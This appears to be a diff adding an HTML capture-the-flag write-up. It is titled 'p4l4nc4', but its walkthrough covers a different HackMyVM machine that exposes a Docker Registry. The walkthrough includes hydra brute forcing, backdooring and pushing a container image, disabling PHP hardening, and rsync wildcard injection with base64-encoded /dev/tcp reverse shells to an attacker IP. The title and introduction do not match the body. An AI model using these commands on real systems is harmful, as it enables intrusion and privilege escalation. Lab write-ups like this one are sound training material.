@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A</title>
+    <link rel="icon" href="../images/icons/A.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+
+</head>
+<body>
+    <div class="topnav">
+        <div class="logo">
+            <h2>Analogman</h2>
+        </div>
+        <div class="social-links">
+            <a href="https://youtu.be/9J62hGda9BQ?si=FGMES2gz8cWz9U3k" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+        </div>
+
+        <div class="menu-icon" onclick="toggleMenu()">
+            <i class="fa fa-bars"></i>
+        </div>
+        <!-- Menú desplegable que estará oculto por defecto -->
+        <ul class="navbar">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="#">Tags</a></li>
+            <li><a href="../wp/index.html">WriteUps</a></li>
+        </ul>
+    </div>
+    <script>
+        function toggleMenu() {
+            const navbar = document.querySelector('.navbar');
+            navbar.classList.toggle('open');  
+        }
+    </script>
+    <div class="header">
+        <div class="wrapper">
+            <div class="sidebar">
+                <div class="profile">
+                    <img src="../images/profile.jpg" alt="">
+                    <h2>Analogman</h2>
+                    <h5>Hacker learner</h5>
+                </div>
+                <ul class="navbar">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="#">Tags</a></li>
+                    <li><a href="../wp/index.html">WriteUps</a></li>
+                </ul>
+            </div>
+
+            <!--testing-->
+            <div class="rightsidebar">
+                <div style="margin-top: 50px; margin-right: 16px;" class="title-container">
+                    <img src="../images/icons/hvm_icon.png" alt="Icon" class="title-icon">
+                    <h2 class="title">p4l4nc4</h2>
+                </div>
+                
+                <img src="../images/Posts/p4l4nc4/palanca.png" alt="" class="right-machineimage">
+
+                <ul style="margin-bottom: 350px;" class="navbar">
+                    <h1>Table of Contents</h1>
+                    <li><a href="#Introduction" class="sidebar-link">1. Introduction</a></li>
+                    <li><a href="#Internal-Network-Compromise-Walkthrough" class="sidebar-link">2. Internal Network Compromise Walkthrough</a></li>
+                    <ul>
+                        <li><a href="#Enumeration" class="sidebar-link">2.1 Enumeration</a></li>
+                        <li><a href="#Foothold" class="sidebar-link">2.2 Foothold</a></li>
+                        <li><a href="#Privilege-Escalation" class="sidebar-link">2.3 Privilege Escalation</a></li>
+                    </ul>
+                </ul>
+            </div>
+            <!--testing-->
+
+            <!-- writeups aquí -->
+            <div class="writeup-container">
+                <h1>p4l4nc4 WriteUp</h1>
+                
+                <section class="content">
+                    <!-- Texto explicativo -->
+                    <div class="img-container">
+                        <img src="../images/Posts/p4l4nc4/palanca_Description.png" alt="Preview" class="machine-image">
+                    </div>
+                    
+                    <div class="table-contents">
+                        <h1>Table of Contents</h1>
+                        <ul>
+                            <li><a href="#Introduction">1. Introduction</a></li>
+                            <li><a href="#Internal-Network-Compromise-Walkthrough">2. Internal Network Compromise Walkthrough</a></li>
+                            <ul>
+                                <li><a href="#Enumeration">2.1 Enumeration</a></li>
+                                <li><a href="#Foothold">2.2 Foothold</a></li>
+                                <li><a href="#Privilege-Escalation">2.3 Privilege Escalation</a></li>
+                            </ul>
+                        </ul>
+                    </div>
+
+                    <section id="Introduction">
+                        <h1>1. Introduction</h1>
+                        <p>p4l4nc4 is an easy <strong>HackMyVm</strong> Linux machine, designed by <a href="https://hackmyvm.eu/profile/?user=elpensador" target="_blank">elpensador</a>. This machine is ideal for those who are just starting out on this platform. In this writeup, we will explore how to write a Bash script that will help us perform a detailed file enumeration on a specific service. Additionally, we will examine excessive configurations and permissions within the system, allowing us to identify potential vectors for privilege escalation.</p>
+                    </section>
+                                        
+                    <section id="Internal-Network-Compromise-Walkthrough">
+                        <h1>2. Internal Network Compromise Walkthrough</h1>
+                        <p>This section will detail a full walkthrough of the machine exploitation process, broken down step-by-step. We will begin with the enumeration phase, which will scan for open ports, available services, and potential vulnerabilities in the system, including reviewing the web application if applicable. Next, we will delve deeper into active services and their configurations, and then move on to exploiting any identified vulnerabilities. Finally, we will cover privilege escalation, describing the techniques and tools used to gain access to the system as the highest-level user, thereby achieving full control of the machine.</p>
+                    </section>
+                    
+                    <section id="Enumeration">
+                        <h1>2.1 Enumeration</h1>
+                        
+                        <h3>Nmap</h3>
+                        <p>We proceed to list open ports with the nmap tool.</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo nmap -v -n -sCV -Pn -p22,80,5000 10.10.20.7
+
+Nmap scan report for 10.10.20.7
+Host is up (0.00019s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.66 ((Debian))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.66 (Debian)
+|_http-title: Default site
+5000/tcp open  http    Docker Registry (API: 2.0)
+|_http-title: Site doesn't have a title.
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+MAC Address: 08:00:27:6F:9C:3C (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 18:21
+Completed NSE at 18:21, 0.00s elapsed
+Initiating NSE at 18:21
+Completed NSE at 18:21, 0.00s elapsed
+Initiating NSE at 18:21
+Completed NSE at 18:21, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.70 seconds
+           Raw packets sent: 4 (160B) | Rcvd: 4 (160B)
+
+                            </pre>
+                        </div>
+                        
+                        <p>From the previous scan we have:</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Port</th>
+                                    <th>Service</th>
+                                    <th>Version</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>22</td>
+                                    <td>SSH</td>
+                                    <td>OpenSSH 10.0p2 Debian 7+deb13u2</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>80</td>
+                                    <td>http</td>
+                                    <td>Apache httpd 2.4.66</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>5000</td>
+                                    <td>http</td>
+                                    <td>Docker Registry (API: 2.0)</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>HTTP</h3>
+                        <p>We go to http://10.10.20.7/ using a web browser:</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/1.png" alt="">
+                        </div>
+                        <p>A few seconds later, we were redirected to: http://latestwasalie.hmv/</p>
+                        <p>We added this to our hosts file:</p>
+                        <div class="console-code">
+                            <pre>
+$ echo '10.10.20.7 latestwasalie.hm ' | sudo tee -a /etc/hosts
+                            </pre>
+                        </div>
+                        <p>Upon returning to the web application, we identified a platform exposing a service functionality.</p>
+
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/2.png" alt="">
+                        </div>
+                        <p>By inspecting the source code, a potential username was discovered: adm</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/3.png" alt="">
+                        </div>
+
+                        <h3>Fuzzing</h3>
+                        <p>We then proceeded to perform directory fuzzing against the target endpoint:</p>
+                        <div class="console-code">
+                            <pre>
+$ ffuf -u "http://10.10.20.7:5000/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/4.png" alt="">
+                        </div>
+                        
+                        
+                        <p>This enumeration revealed the /v2/ endpoint.</p>
+                        <p>Navigating to http://10.10.20.7:5000/v2/ prompted an HTTP Basic Authentication.</p>
+
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/5.png" alt="">
+                        </div>
+                        <p>We attempted to brute-force the credentials using the previously identified username:</p>
+                        <div class="console-code">
+                            <pre>
+$ hydra -l adm -P /usr/share/wordlists/rockyou.txt 10.10.20.7 http-get /v2/ -s 5000 -t 64 -I
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/6.png" alt="">
+                        </div>
+                        <p>This attack was successful, yielding the following valid credentials: adm:******</p>
+                        <p>To interact with the service via command line tools such as curl, the credentials were encoded in Base64:</p>
+                        <div class="console-code">
+                            <pre>
+$ echo -n "adm:******" | base64     
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/7.png" alt="">
+                        </div>
+
+                        <p>From the initial nmap scan, it was observed that port 5000 was running a Docker Registry service. This was confirmed with:</p>
+                        <p>Response header:</p>
+                        <div class="console-code">
+                            <pre>
+$ curl -S "http://10.10.20.7:5000/v2/" -H 'Authorization: Basic **********' -I     
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/8.png" alt="">
+                        </div>
+                        <p>After researching the Docker Registry service and its attack surface, we proceeded with further enumeration and exploitation. For further information you can explore these links below:</p>
+                        
+                        <p>We confirmed the presence of a repository hosted on the registry:</p>
+                        <div class="console-code">
+                            <pre>
+$ curl -S "http://10.10.20.7:5000/v2/_catalog"  -H 'Authorization: Basic ***********'
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/9.png" alt="">
+                        </div>
+                        <p>And enumerated its available tags:</p>
+                        <div class="console-code">
+                            <pre>
+$ curl -S "http://10.10.20.7:5000/v2/latestwasalie-web/tags/list#"  -H 'Authorization: Basic *********' | jq
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/10.png" alt="">
+                        </div>
+
+
+
+                        <p>Next, we pulled the image locally to analyze and interact with it:</p>
+                        <p>First, authentication to the registry was required:</p>
+                        <div class="console-code">
+                            <pre>
+$ docker login 10.10.20.7:5000
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/11.png" alt="">
+                        </div>
+                        <p>Then, we pulled the image:</p>
+                        <div class="console-code">
+                            <pre>
+$ docker image pull 10.10.20.7:5000/latestwasalie-web
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/12.png" alt="">
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/13.png" alt="">
+                        </div>
+                        <p>We verified that the image was successfully downloaded:</p>
+                        <div class="console-code">
+                            <pre>
+$ docker image ls
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/14.png" alt="">
+                        </div>
+                        <p>The container was then instantiated locally:</p>
+                        <div class="console-code">
+                            <pre>
+$ docker container run -d --name latestwasalie-web -p 8080:80 10.10.20.7:5000/latestwasalie-web
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/15.png" alt="">
+                        </div>
+                        <p>After confirming it was running, we obtained a root shell inside the container:</p>
+                        <div class="console-code">
+                            <pre>
+$ docker container ls
+$ docker container exec -u 0 -it latestwasalie-web /bin/bash
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/16.png" alt="">
+                        </div>
+                        <p>At this stage, we were able to inspect and modify the filesystem locally before pushing changes back to the remote registry.</p>
+                        <p>Initially, attempts to achieve Remote Code Execution (RCE) via PHP were unsuccessful, as dangerous functions such as system, exec, and passthru were disabled.</p>
+                        <p>To identify where these restrictions were defined, we searched for PHP configuration files:</p>
+                        <div class="console-code">
+                            <pre>
+$ grep -Rin "disable_functions" /usr/ 2>/dev/null
+$ cat zz-hardening.ini
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/17.png" alt="">
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/18.png" alt="">
+                        </div>
+                        <p>This led to the discovery of the zz-hardening.ini file, which enforced the restriction of dangerous PHP functions.</p>
+                        <p>We modified this file to remove the restrictions:</p>
+                        <div class="console-code">
+                            <pre>
+$ sed -i 's/^disable_functions=.*/disable_functions=/' zz-hardening.ini
+$ cat zz-hardening.ini
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/19.png" alt="">
+                        </div>
+                        <p>With these restrictions removed, we were able to deploy a PHP web shell.</p>
+                        <p>We navigated to /var/www/default and uploaded a reverse shell (php-reverse-shell in this case). After configuring it with our IP and port, we hosted it locally and downloaded it into the container:</p>
+                        <div class="console-code">
+                            <pre>
+$ curl 10.10.20.4/shell.php -O
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/20.png" alt="">
+                        </div>
+                        <p>To persist our changes, we committed the modified container:</p>
+                        <div class="console-code">
+                            <pre>
+$ docker container ls
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/21.png" alt="">
+                        </div>
+                        <div class="console-code">
+                            <pre>
+$ docker container commit e1db57092586
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/22.png" alt="">
+                        </div>
+                        <p>We verified the new image:</p>
+                        <div class="console-code">
+                            <pre>
+$ docker image ls
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/23.png" alt="">
+                        </div>
+                        <p>Then, we tagged the image to match the remote registry repository:</p>
+                        <div class="console-code">
+                            <pre>
+$ docker tag bc1f18c347f7 10.10.20.7:5000/latestwasalie-web
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/24.png" alt="">
+                        </div>
+                        <p>And pushed it back to the registry:</p>
+                        <div class="console-code">
+                            <pre>
+$ docker push 10.10.20.7:5000/latestwasalie-web:latest
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/25.png" alt="">
+                        </div>
+                        <p>At this point, whenever the remote service pulls or restarts the container, it uses our modified image.</p>
+                        <p>Although not fully confirmed, it appears that the target environment periodically refreshes or redeploys the container automatically, which applies our modifications.</p>
+                        <p>We then set up a listener on our attacking machine and triggered the reverse shell:</p>
+                        <div class="console-code">
+                            <pre>
+$ nc -nvlp 80
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/26.png" alt="">
+                        </div>
+                        <p>As expected, a connection was received. However, the container appeared to restart periodically, causing the shell to terminate intermittently. This required fast interaction during exploitation.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/27.png" alt="">
+                        </div>
+                        <p>Since the local and remote containers are identical, we leveraged the local instance for further enumeration.</p>
+                        <p>Back to the local container and identified a suspicious directory: /data.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/28.png" alt="">
+                        </div>
+                        <p>Inside it, we found an /exports directory, which was initially empty in the local container.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/29.png" alt="">
+                        </div>
+                        <p>However, on the remote instance, this directory contained files along with a script utilizing rsync.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/30.png" alt="">
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/31.png" alt="">
+                        </div>
+                        <div class="console-code">
+                            <pre>
+$ cat .rsync_cmd
+# Comando rsync ejecutado el sáb 18 abr 2026 01:55:01 CEST
+rsync -e 'ssh -i /home/backupusr/.ssh/id_ed25519' -av *.txt localhost:/home/backupusr/backup/
+
+# Usuario: backupusr
+# PID: 30468
+# Directorio actual: /srv/platform/appdata/exports
+# Directorio destino: localhost:/home/backupusr/backup
+                            </pre>
+                        </div>
+                        <p>Further analysis revealed that this script was executed by a user belonging to group 1000, and it used a wildcard (*) in an insecure manner. This misconfiguration made it vulnerable to wildcard injection attacks.</p>
+                        <p>By crafting a malicious .txt file containing a reverse shell payload, we were able to exploit this behavior.</p>
+                        <div class="console-code">
+                            <pre>
+$ echo -n "bash -c ' bash -i >& /dev/tcp/10.10.20.4/443 0>&1' " | base64
+YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMjAuNC80NDMgMD4mMScg
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/32.png" alt="">
+                        </div>
+                        <p>back to the server create a rev.txt using:</p>
+                        <div class="console-code">
+                            <pre>
+$ echo 'echo YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMjAuNC80NDMgMD4mMScg|base64 -d |bash' > rev.txt
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/33.png" alt="">
+                        </div>
+                        <p>Listen on port 443:</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/34.png" alt="">
+                        </div>
+                        <p>Finally:</p>
+                        <div class="console-code">
+                            <pre>
+$ touch -- "-e sh rev.txt" 
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/35.png" alt="">
+                        </div>
+                        <p>Once the script executed, it processed our malicious file, resulting in code execution and granting us a shell as the user:</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/36.png" alt="">
+                        </div>
+
+                    </section>
+                    
+                    <section id="Privilege-Escalation">
+                        <h2>2.3 Privilege Escalation</h2>
+                        <p>Once an initial shell was obtained, we proceeded to enumerate the system further. Navigating to the /opt directory, we identified a suspicious .txt file with overly permissive write permissions (world-writable) and owned by root.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/37.png" alt="">
+                        </div>
+                        <p>This strongly suggested that the file might be used by a privileged process, potentially via a scheduled task such as a cron job.</p>
+                        <p>To validate this hypothesis and monitor processes in real time, we transferred and executed pspy on the target system:</p>
+
+                        <div class="console-code">
+                            <pre>
+$ curl 10.10.20.4/pspy64 -O
+$ chmod +x pspy64
+$ ./pspy64
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/38.png" alt="">
+                        </div>
+                        <p>Through process monitoring, we observed that root was executing a command similar to the one previously identified for the backupusr user, involving rsync. In this case, specific files such as note.txt were being processed.</p>
+                        <p>This indicated that the same wildcard injection vulnerability could be exploited again, but this time in the context of a root-level process.</p>
+                        <p>To achieve privilege escalation, we crafted a reverse shell payload encoded in Base64:</p>
+                        <div class="console-code">
+                            <pre>
+$ echo -n "bash -c ' bash -i >& /dev/tcp/10.10.20.4/80 0>&1'  " | base64
+YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMjAuNC84MCAwPiYxJyAg
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/39.png" alt="">
+                        </div>
+                        <p>We then set up a listener on our attacking machine to receive the incoming connection.</p>
+                        <p>Next, we modified the note.txt file to include a command that decodes and executes the payload:</p>
+                        <div class="console-code">
+                            <pre>
+$ echo 'echo YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMjAuNC84MCAwPiYxJyAg|base64 -d |bash' > note.txt
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/40.png" alt="">
+                        </div>
+                        <p>To exploit the wildcard injection vulnerability in rsync, we created a specially crafted filename designed to inject command-line arguments:</p>
+                        <div class="console-code">
+                            <pre>
+$ touch -- "-e sh note.txt"
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/41.png" alt="">
+                        </div>
+                        <p>When the privileged rsync process executed, it interpreted the malicious filename as an option, causing it to execute our payload.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Latest-Was-A-Lie/42.png" alt="">
+                        </div>
+                        <p>After a short delay, the payload was triggered successfully, resulting in a reverse shell with elevated privileges.</p>
+
+
+
+
+                    </section>
+
+                    <!--Final-->
+                </section>
+            </div>
+        </div>
+    </div>
+    
+    
+    <!--Pet Cat-->
+    <div class="pet-container">
+        <img src="" alt="Walking Pet" id="pet" class="pet">
+    </div>
+    <!--Pet Cat-->
+    <script src="script.js"></script>
+</body>
+</html>
